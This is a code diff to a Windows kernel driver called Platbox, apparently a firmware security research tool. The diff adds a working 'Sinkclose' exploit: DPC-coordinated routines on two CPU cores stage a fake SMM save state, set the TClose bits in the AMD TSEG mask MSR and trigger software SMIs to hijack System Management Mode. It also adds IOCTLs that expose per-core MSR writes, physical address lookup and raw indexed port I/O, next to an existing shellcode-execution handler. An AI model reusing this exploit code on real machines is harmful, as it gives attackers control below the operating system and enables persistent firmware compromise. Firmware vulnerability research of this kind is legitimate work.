@@ -1,6 +1,7 @@
 #pragma once
 #include "Platbox.h"
 #include "CbHooks.h"
+#include "intrin.h"
 
 #ifdef ALLOC_PRAGMA
 #pragma alloc_text(INIT, DriverEntry)
@@ -9,11 +10,20 @@
 #pragma alloc_text(PAGE, IrpUnloadHandler)
 #pragma alloc_text(PAGE, IrpDeviceIoCtlHandler)
 #pragma alloc_text(PAGE, IrpNotImplementedHandler)
-
 #endif
 
+#define SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR 0x3000
+#define CORE1_FAKE_STATE_AREA 0x200
+static PVOID SinkcloseCore1RecoverVaddr;
 
 USER_MAPPED_MEM* g_root_user_mapped_mem = NULL;
+
+
+PHYSICAL_ADDRESS GetPhysicalAddress(PVOID VirtualAddress) {
+	PHYSICAL_ADDRESS physicalAddress = MmGetPhysicalAddress(VirtualAddress);
+	return physicalAddress;
+}
+
 
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
 	UINT32 i = 0;
@@ -122,10 +132,6 @@ VOID IrpUnloadHandler(IN PDRIVER_OBJECT DriverObject) {
 			curr = next;
 		}
 	}
-			
-
-	
-
 
 	RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\PlatboxDev");
 
@@ -160,11 +166,15 @@ NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
 
 	IrpSp = IoGetCurrentIrpStackLocation(Irp);
 	IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;
+	DbgPrint("[+] IOCTL Code: 0x%X\n", IoControlCode);
 	//__debugbreak();
 	if (IrpSp) {
 		switch (IoControlCode) {
 		case IOCTL_ISSUE_SW_SMI:
 			Status = SendSWSmiHandler(Irp, IrpSp);
+			break;
+		case IOCTL_SINKCLOSE:
+			Status = Sinkclose(Irp, IrpSp);
 			break;
 		case IOCTL_EXECUTE_SHELLCODE:
 			Status = ExecuteShellcodeHandler(Irp, IrpSp);
@@ -202,8 +212,14 @@ NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
 		case IOCTL_READ_MSR:
 			Status = ReadMSR(Irp, IrpSp);
 			break;
+		case IOCTL_READ_MSR_FOR_CORE:
+			Status = ReadMSRForCore(Irp, IrpSp);
+			break;
 		case IOCTL_WRITE_MSR:
 			Status = WriteMSR(Irp, IrpSp);
+			break;
+		case IOCTL_WRITE_MSR_FOR_CORE:
+			Status = WriteMSRForCore(Irp, IrpSp);
 			break;
 		case IOCTL_READ_IO_PORT:
 			Status = ReadIOPort(Irp, IrpSp);
@@ -238,6 +254,12 @@ NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
 		case IOCTL_GET_PHYSICAL_RANGES:
 			Status = GetPhysicalMemoryRanges(Irp, IrpSp);
 			break;
+		case IOCTL_GET_PHYSICAL_ADDRESS:
+			Status = IoctlGetPhysicalAddress(Irp, IrpSp);
+			break;
+		case IOCTL_INDEX_IO_OPERATION:
+			Status = IoctlIndexIO(Irp, IrpSp);
+			break;
 		default:
 			DbgPrint("[-] Invalid IOCTL Code: 0x%X\n", IoControlCode);
 			Status = STATUS_INVALID_DEVICE_REQUEST;
@@ -247,7 +269,6 @@ NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
 	}
 
 	Irp->IoStatus.Status = Status;
-	//Irp->IoStatus.Information = 0;
 	// Complete the request
 	IoCompleteRequest(Irp, IO_NO_INCREMENT);
 
@@ -256,6 +277,7 @@ NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
 
 
 #pragma auto_inline(off)
+
 
 
 NTSTATUS SendSWSmiHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
@@ -268,16 +290,168 @@ NTSTATUS SendSWSmiHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
 		__try
 		{
 			_swsmi(Irp->AssociatedIrp.SystemBuffer);
+
 			Status = STATUS_SUCCESS;
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER)
 		{
 			Status = GetExceptionCode();
-		}	
-	}	
+		}
+	}
 	Irp->IoStatus.Information = 0;
 	return Status;
 }
+
+
+
+long Core1StagingExecuted = 0;
+long Core1StagingFinished = 0;
+void Core1_Staging(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
+{
+	// Set Core1StagingFinished to 0
+	InterlockedAnd(&Core1StagingFinished, 0);
+
+	// Signal core 0 that this is executing
+	InterlockedIncrement(&Core1StagingExecuted);
+
+	// Wait for core 0 to finish SMI
+	while (InterlockedCompareExchange(&Core1StagingFinished, 1, 1) != 1);
+
+	return;
+}
+
+
+long Core1SinkcloseExecuted = 0;
+long Core1SinkcloseFinished = 0;
+void Core1_Sinkclose(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
+{
+	// Set SinkcloseCore1Finished to 0
+	InterlockedAnd(&Core1SinkcloseFinished, 0);
+
+	// Set RIP, RBP, RSP and CR3 into CORE1_FAKE_STATE_AREA
+	_store_savestate((char *)SinkcloseCore1RecoverVaddr + CORE1_FAKE_STATE_AREA);
+
+	// Signal core 0 that this is executing
+	InterlockedIncrement(&Core1SinkcloseExecuted);
+
+	// Wait for core 0 to finish SMI
+	while (InterlockedCompareExchange(&Core1SinkcloseFinished, 1, 1) != 1);
+
+	return;
+}
+
+#define AMD_MSR_SMM_TSEG_MASK  0xC0010113
+long SinkcloseDpcExecuted = 0;
+void SinkcloseExploit(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
+{
+	UINT64 tseg_mask = 0;
+	SW_SMI_CALL *Smi = (SW_SMI_CALL *)SystemArgument1;
+	PKDPC pkdpc = NULL;
+
+	if (Smi->rax == 0x31337)
+	{
+		// Set Core1StagingExecuted to 0
+		InterlockedAnd(&Core1StagingExecuted, 0);
+
+		pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
+		KeInitializeDpc(pkdpc, Core1_Staging, NULL);
+		KeSetTargetProcessorDpc(pkdpc, 1);
+
+		// Schedule the callback to be executed on core 1 asynchronously
+		KeInsertQueueDpc(pkdpc, NULL, NULL);
+
+		// Busy wait until core 1 executes
+		while (InterlockedCompareExchange(&Core1StagingExecuted, 1, 1) != 1);
+
+		// Execute SMI
+		// This is done to save the registers of core 0 and core 1 to SMM SAVE STATE
+		_swsmi(Smi);
+
+		// Signal core 1 that it can continue
+		InterlockedIncrement(&Core1StagingFinished);
+		ExFreePool(pkdpc);
+	}
+
+	// Triggered on second SMI
+	if (Smi->rax == 0x31338)
+	{
+		// Set Core1SinkcloseExecuted to 0
+		InterlockedAnd(&Core1SinkcloseExecuted, 0);
+
+		pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
+		KeInitializeDpc(pkdpc, Core1_Sinkclose, NULL);
+		KeSetTargetProcessorDpc(pkdpc, 1);
+
+		// Schedule the callback to be executed on core 1 asynchronously
+		KeInsertQueueDpc(pkdpc, NULL, NULL);
+
+		// Busy wait until core 1 executes
+		while (InterlockedCompareExchange(&Core1SinkcloseExecuted, 1, 1) != 1);
+
+		// Executes SMI with TClose enabled
+		_rdmsr(AMD_MSR_SMM_TSEG_MASK, &tseg_mask);
+        tseg_mask = tseg_mask | (0b11 << 2);
+        _wrmsr(AMD_MSR_SMM_TSEG_MASK, tseg_mask);
+		_swsmi(Smi);
+		
+		// Signal core 1 that it can continue
+		InterlockedIncrement(&Core1SinkcloseFinished);
+
+		ExFreePool(pkdpc);
+	}
+
+	InterlockedIncrement(&SinkcloseDpcExecuted);
+}
+
+
+NTSTATUS Sinkclose(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+	UNREFERENCED_PARAMETER(Irp);
+	PAGED_CODE();
+
+	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength == sizeof(SW_SMI_CALL)) {
+		__try
+		{
+			// Map the recovery address for core 1
+			PHYSICAL_ADDRESS SaveStatePa = { 0 };
+			SaveStatePa.QuadPart = SINKCLOSE_CORE1_RECOVER_PHYSICAL_ADDR & ~(0xFFF);
+			SinkcloseCore1RecoverVaddr = MmMapIoSpace(SaveStatePa, PAGE_SIZE, MmNonCached);
+
+			PSW_SMI_CALL Buffer = (PSW_SMI_CALL)(Irp->AssociatedIrp.SystemBuffer);
+			PKDPC pkdpc = NULL;
+
+			// Set SinkcloseDpcExecuted to 0; will be set by core 0 when function finishes
+			InterlockedAnd(&SinkcloseDpcExecuted, 0);
+
+			// Schedule the callback to be executed on CPU 0 asynchronously
+			pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
+			KeInitializeDpc(pkdpc, SinkcloseExploit, NULL);
+			KeSetTargetProcessorDpc(pkdpc, 0);
+
+			// Notify core 1 and wait until DpcExecuted == 1
+			KeInsertQueueDpc(pkdpc, Buffer, NULL);
+
+			// Wait until core 0 finishes function
+			while (InterlockedCompareExchange(&SinkcloseDpcExecuted, 1, 1) != 1);
+			
+			// Free resources
+			ExFreePool(pkdpc);
+
+			MmUnmapIoSpace(SinkcloseCore1RecoverVaddr, PAGE_SIZE);
+			SinkcloseCore1RecoverVaddr = NULL;
+
+			Status = STATUS_SUCCESS;
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER)
+		{
+			Status = GetExceptionCode();
+		}
+	}
+	Irp->IoStatus.Information = 0;
+	return Status;
+}
+
 
 NTSTATUS ExecuteShellcodeHandler(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
@@ -584,6 +758,63 @@ NTSTATUS ReadMSR(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
 	return Status;
 }
 
+long ReadMsrForCoreExecuted = 0;
+void ReadMsrForCoreCallback(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
+{
+	PREAD_MSR_FOR_CORE_CALL Buffer = (PREAD_MSR_FOR_CORE_CALL)SystemArgument1;
+
+	// Read the MSR
+	_rdmsr(Buffer->msr, &Buffer->result);
+	
+	// Signal the caller that the callback is finished
+	InterlockedIncrement(&ReadMsrForCoreExecuted);
+}
+
+NTSTATUS ReadMSRForCore(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+	UNREFERENCED_PARAMETER(Irp);
+	PAGED_CODE();
+
+	Irp->IoStatus.Information = 0;
+	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(READ_MSR_FOR_CORE_CALL)) {
+		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(DWORD64)) {
+			PREAD_MSR_FOR_CORE_CALL Buffer = (PREAD_MSR_FOR_CORE_CALL)Irp->AssociatedIrp.SystemBuffer;
+			__try {
+				PKDPC pkdpc = NULL;
+
+				// Set SinkcloseDpcExecuted to 0; will be set by core 0 when function finishes
+				InterlockedAnd(&ReadMsrForCoreExecuted, 0);
+
+				// Schedule the callback to be executed on CPU 0 asynchronously
+				pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
+				KeInitializeDpc(pkdpc, ReadMsrForCoreCallback, NULL);
+				KeSetTargetProcessorDpc(pkdpc, Buffer->core_id);
+
+				// Schedule on core X
+				KeInsertQueueDpc(pkdpc, Buffer, NULL);
+
+				// Wait until core 0 finishes function
+				while (InterlockedCompareExchange(&ReadMsrForCoreExecuted, 1, 1) != 1);
+				
+				// Free resources
+				ExFreePool(pkdpc);
+
+				DWORD64 tmp = Buffer->result;
+				*(DWORD64 *)Irp->AssociatedIrp.SystemBuffer = tmp;
+				Irp->IoStatus.Information = sizeof(DWORD64);
+				Status = STATUS_SUCCESS;
+			}
+			__except (EXCEPTION_EXECUTE_HANDLER) {
+				*(DWORD64 *)Irp->AssociatedIrp.SystemBuffer = 0xFFFFFFFFFFFFFFFF;
+				Irp->IoStatus.Information = sizeof(DWORD64);
+				Status = STATUS_SUCCESS;
+			}
+		}
+	}
+	return Status;
+}
+
 NTSTATUS WriteMSR(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
 
@@ -591,10 +822,62 @@ NTSTATUS WriteMSR(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
 	PAGED_CODE();
 
 	Irp->IoStatus.Information = 0;
-	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_MSR_CALL)) {		
+	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_MSR_CALL)) {
 		PWRITE_MSR_CALL p = (PWRITE_MSR_CALL)Irp->AssociatedIrp.SystemBuffer;
 		__try {
 			_wrmsr(p->msr, p->value);
+			Status = STATUS_SUCCESS;
+		}
+		__except (EXCEPTION_EXECUTE_HANDLER) {
+
+		}
+
+	}
+	return Status;
+}
+
+
+long WriteMsrForCoreExecuted = 0;
+void WriteMsrForCoreCallback(IN PKDPC Dpc, IN PVOID DeferredContext, IN PVOID SystemArgument1, IN PVOID SystemArgument2)
+{
+	PWRITE_MSR_FOR_CORE_CALL Buffer = (PWRITE_MSR_FOR_CORE_CALL)SystemArgument1;
+
+	// Write the MSR
+	_wrmsr(Buffer->msr, Buffer->value);
+	
+	// Signal the caller that the callback is finished
+	InterlockedIncrement(&WriteMsrForCoreExecuted);
+}
+
+NTSTATUS WriteMSRForCore(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+	UNREFERENCED_PARAMETER(Irp);
+	PAGED_CODE();
+
+	Irp->IoStatus.Information = 0;
+	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(WRITE_MSR_FOR_CORE_CALL)) {		
+		PWRITE_MSR_FOR_CORE_CALL Buffer = (PWRITE_MSR_FOR_CORE_CALL)Irp->AssociatedIrp.SystemBuffer;
+		__try {
+			PKDPC pkdpc = NULL;
+
+			// Set WriteMsrForCoreExecuted to 0; will be set by core 0 when function finishes
+			InterlockedAnd(&WriteMsrForCoreExecuted, 0);
+
+			// Schedule the callback to be executed on CPU 0 asynchronously
+			pkdpc = (PKDPC)ExAllocatePool(NonPagedPool, sizeof(KDPC));
+			KeInitializeDpc(pkdpc, WriteMsrForCoreCallback, NULL);
+			KeSetTargetProcessorDpc(pkdpc, Buffer->core_id);
+
+			// Schedule on core N
+			KeInsertQueueDpc(pkdpc, Buffer, NULL);
+
+			// Wait until core 0 finishes function
+			while (InterlockedCompareExchange(&WriteMsrForCoreExecuted, 1, 1) != 1);
+			
+			// Free resources
+			ExFreePool(pkdpc);
+
 			Status = STATUS_SUCCESS;
 		}
 		__except (EXCEPTION_EXECUTE_HANDLER) {
@@ -604,6 +887,8 @@ NTSTATUS WriteMSR(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
 	}
 	return Status;
 }
+
+
 
 NTSTATUS ReadIOPort(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
 	NTSTATUS Status = STATUS_UNSUCCESSFUL;
@@ -615,30 +900,23 @@ NTSTATUS ReadIOPort(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
 	if (IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(IO_PORT_CALL)) {
 		if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(IO_PORT_CALL)) {
 			PIO_PORT_CALL p = (PIO_PORT_CALL)Irp->AssociatedIrp.SystemBuffer;
-			__try {
-				switch(p->size) {
-					case IO_SIZE_BYTE:
-						p->data = __inbyte(p->port);
-						break;
-					case IO_SIZE_WORD:
-						p->data = __inword(p->port);
-						break;
-					case IO_SIZE_DWORD:
-						p->data = __indword(p->port);
-						break;
-					default:
-						Irp->IoStatus.Information = 0;
-						return STATUS_INVALID_PARAMETER;
-				}
-				memcpy(Irp->AssociatedIrp.SystemBuffer, p, sizeof(IO_PORT_CALL));
-				Irp->IoStatus.Information = sizeof(IO_PORT_CALL);
-				Status = STATUS_SUCCESS;
+			
+			switch(p->size) {
+				case IO_SIZE_BYTE:
+					p->data = __inbyte(p->port);
+					break;
+				case IO_SIZE_WORD:
+					p->data = __inword(p->port);
+					break;
+				case IO_SIZE_DWORD:
+					p->data = __indword(p->port);
+					break;
+				default:
+					Irp->IoStatus.Information = 0;
+					return STATUS_INVALID_PARAMETER;
 			}
-			__except (EXCEPTION_EXECUTE_HANDLER) {
-				*(DWORD64 *)Irp->AssociatedIrp.SystemBuffer = 0xFFFFFFFFFFFFFFFF;
-				Irp->IoStatus.Information = sizeof(DWORD64);
-				Status = STATUS_UNSUCCESSFUL;
-			}
+			Irp->IoStatus.Information = sizeof(IO_PORT_CALL);
+			Status = STATUS_SUCCESS;
 		}
 	}
 	return Status;
@@ -1060,5 +1338,100 @@ NTSTATUS GetPhysicalMemoryRanges(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
 exit:
 	return Status;
 }
+
+
+NTSTATUS IoctlGetPhysicalAddress(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
+{
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+	UNREFERENCED_PARAMETER(Irp);
+	PAGED_CODE();
+
+	Irp->IoStatus.Information = 0;
+
+	if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(UINT64) &&
+		IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(UINT64)) {
+
+		UINT64 va = *(UINT64*)Irp->AssociatedIrp.SystemBuffer;
+		UINT64 pa = (UINT64) GetPhysicalAddress((PVOID) va).QuadPart;
+
+		*(UINT64 *)Irp->AssociatedIrp.SystemBuffer = pa;
+
+		Irp->IoStatus.Information = sizeof(UINT64);
+		Status = STATUS_SUCCESS;
+	}
+
+
+exit:
+	return Status;
+}
+
+
+NTSTATUS IoctlIndexIO(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp)
+{
+	NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+	UNREFERENCED_PARAMETER(Irp);
+	PAGED_CODE();
+
+	Irp->IoStatus.Information = 0;
+
+	if (IrpSp->Parameters.DeviceIoControl.OutputBufferLength >= sizeof(IO_PORT_INDEX_CALL) &&
+		IrpSp->Parameters.DeviceIoControl.InputBufferLength >= sizeof(IO_PORT_INDEX_CALL)) {
+
+		PIO_PORT_INDEX_CALL p = (PIO_PORT_INDEX_CALL)Irp->AssociatedIrp.SystemBuffer;
+	
+		switch (p->operation) {
+			case INDEX_IO_BYTE_READ_BYTE:
+				// Write Index to CMD Port
+				__outbyte(p->cmd_port, p->index);
+				// Read from DATA port
+				p->data = __inbyte(p->data_port);
+				break;
+			case INDEX_IO_WORD_READ_BYTE:
+				__outword(p->cmd_port, p->index);
+				p->data = __inbyte(p->data_port);
+				break;
+			case INDEX_IO_BYTE_READ_WORD:
+				__outbyte(p->cmd_port, p->index);
+				p->data = __inword(p->data_port);
+				break;
+			case INDEX_IO_WORD_READ_WORD:
+				__outword(p->cmd_port, p->index);
+				p->data = __inword(p->data_port);
+				break;			
+			case INDEX_IO_BYTE_WRITE_BYTE:
+				__outbyte(p->cmd_port, p->index);
+				__outbyte(p->data_port, p->data);
+				break;
+			case INDEX_IO_WORD_WRITE_BYTE:
+				__outword(p->cmd_port, p->index);
+				__outbyte(p->data_port, p->data);
+				break;
+			case INDEX_IO_BYTE_WRITE_WORD:
+				__outbyte(p->cmd_port, p->index);
+				__outword(p->data_port, p->data);
+				break;
+			case INDEX_IO_WORD_WRITE_WORD:
+				__outword(p->cmd_port, p->index);
+				__outword(p->data_port, p->data);
+				break;
+			default:
+				Irp->IoStatus.Information = 0;
+				return STATUS_INVALID_PARAMETER;
+			}
+
+		Irp->IoStatus.Information = sizeof(IO_PORT_INDEX_CALL);
+		Status = STATUS_SUCCESS;		
+	}
+
+
+exit:
+	return Status;
+}
+
+
+
+
 
 #pragma auto_inline()
